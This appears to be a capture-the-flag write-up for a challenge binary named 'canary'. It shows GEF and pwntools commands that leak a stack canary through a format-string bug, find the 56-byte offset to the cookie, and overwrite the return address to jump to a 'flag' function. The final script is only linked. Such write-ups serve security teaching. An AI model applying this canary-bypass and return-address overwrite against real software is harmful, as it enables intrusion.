
# Canary

As a sanity check, we can leak the stack canary in GEF by doing the following:

```sh
$ gdb ./canary
gef> break greet
gef> run
gef> canary
gef> nexti
gef> nexti
gef> nexti
gef> nexti
[+] Found AT_RANDOM at 0x7fffffffe3d9, reading 8 bytes
[+] The canary of process 3493 is 0xba8e9239e44d3900
gef> x/12xg $rsp
0x7fffffffdfa0: 0x000000000000000a      0x00007ffff7e74193
0x7fffffffdfb0: 0x0000000000000019      0x00007ffff7faf760
0x7fffffffdfc0: 0x0000000000400c17      0x00007ffff7e691ea
0x7fffffffdfd0: 0x0000000000000000      0x00007fffffffe000
0x7fffffffdfe0: 0x00000000004006a0      0x00007fffffffe100
0x7fffffffdff0: 0x0000000000000000      0xba8e9239e44d3900
```

Note that the stack canary is the last quadword shown in the output.

After comparing format string leaked stack value output and output from GEF's `canary` command, we can observe that the stack canary will be the 17th item leak from our format string.

We can next find the offset (in bytes) needed to overwrite the stack cookie with the following:

```sh
# Generate cyclic pattern.
pwn cyclic -n 8 128

# Start debugging and break where the stack cookie comparison occurs.
gdb ./canary
gef> break *0x400945
gef> run

# Using the observe RAX value from the above debugging, we can find the offset
# to the stack cookie.
$ pwn cyclic -n 8 -l 0x6161616161616168
56
```

Since the stack cookie is stored before the stored RBP and RIP addresses on the stack, we must add 16 to our offset to get the offset to overwrite RIP.

We get the `flag` address that we want to overwrite RIP with:

```sh
# Find the address of the flag function.
$ nm -s ./canary | grep flag
0000000000400787 T flag
```

And we now have enough information to fire the exploit. This is all put together in the solution script [here](./solve.py)
